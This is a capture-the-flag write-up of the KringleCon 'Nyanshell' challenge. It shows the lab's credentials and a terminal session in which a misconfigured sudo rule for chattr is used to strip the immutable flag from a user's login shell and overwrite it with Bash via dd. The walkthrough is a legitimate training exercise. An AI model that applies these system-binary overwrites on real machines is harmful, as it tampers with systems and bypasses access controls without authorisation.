# 2. Secondary Objectives
## 2.7. Nyanshell
### 2.7.1. Description
Speaking with Alabaster Snowball:
>Every time I try to log in, I get accosted with ... a hatted cat and a toaster pastry? I thought my shell was Bash, not flying feline. When I try to overwrite it with something else, I get permission errors. Have you heard any chatter about immutable files? And what is sudo -l telling me?

Nyanshell motd:
```
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄░░░░░░░░░
░░░░░░░░▄▀░░░░░░░░░░░░▄░░░░░░░▀▄░░░░░░░
░░░░░░░░█░░▄░░░░▄░░░░░░░░░░░░░░█░░░░░░░
░░░░░░░░█░░░░░░░░░░░░▄█▄▄░░▄░░░█░▄▄▄░░░
░▄▄▄▄▄░░█░░░░░░▀░░░░▀█░░▀▄░░░░░█▀▀░██░░
░██▄▀██▄█░░░▄░░░░░░░██░░░░▀▀▀▀▀░░░░██░░
░░▀██▄▀██░░░░░░░░▀░██▀░░░░░░░░░░░░░▀██░
░░░░▀████░▀░░░░▄░░░██░░░▄█░░░░▄░▄█░░██░
░░░░░░░▀█░░░░▄░░░░░██░░░░▄░░░▄░░▄░░░██░
░░░░░░░▄█▄░░░░░░░░░░░▀▄░░▀▀▀▀▀▀▀▀░░▄▀░░
░░░░░░█▀▀█████████▀▀▀▀████████████▀░░░░
░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░

nyancat, nyancat
I love that nyancat!
My shell's stuffed inside one
Whatcha' think about that?

Sadly now, the day's gone
Things to do!  Without one...
I'll miss that nyancat
Run commands, win, and done!

Log in as the user alabaster_snowball with a password of Password2, and land in a Bash prompt.

Target Credentials:

username: alabaster_snowball
password: Password2
elf@e60e948135e9:~$
```
### 2.7.2. Solution
```
elf@e60e948135e9:~$ sudo -l
Matching Defaults entries for elf on e60e948135e9:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User elf may run the following commands on e60e948135e9:
    (root) NOPASSWD: /usr/bin/chattr
```
Trying to su to alabaster_snowball with `elf@e60e948135e9:~$ su alabaster_snowball` returns the below image:
![Nyancat](https://github.com/LamonatoAndrea/KringleCon2/blob/master/02%20-%20Secondary%20Objectives/07%20-%20Nyanshell/Nyancat.png)
```
elf@e60e948135e9:~$ cat /etc/passwd | grep alabaster
alabaster_snowball:x:1001:1001::/home/alabaster_snowball:/bin/nsh
elf@e60e948135e9:~$ xxd /bin/nsh  | head -n 1
00000000: 7f45 4c46 0201 0100 0000 0000 0000 0000  .ELF............
elf@e60e948135e9:~$ chattr -i /bin/nsh 
chattr: Permission denied while setting flags on /bin/nsh
elf@e60e948135e9:~$ sudo chattr -i /bin/nsh
elf@e60e948135e9:~$ dd if=/bin/bash of=/bin/nsh
2.7.+1 records in
2.7.+1 records out
1168776 bytes (1.2 MB, 1.1 MiB) copied, 0.00964688 s, 121 MB/s
elf@e60e948135e9:~$ su alabaster_snowball
Password: 
Loading, please wait......



You did it! Congratulations!

alabaster_snowball@e60e948135e9:/home/elf$
```
### 2.7.3. Afterwords
Speaking again with Alabaster Snowball:
>Who would do such a thing?? Well, it IS a good looking cat. Have you heard about the Frido Sleigh contest? There are some serious prizes up for grabs. The content is strictly for elves. Only elves can pass the CAPTEHA challenge required to enter. I heard there was a talk at KCII about using machine learning to defeat challenges like this. I don't think anything could ever beat an elf though!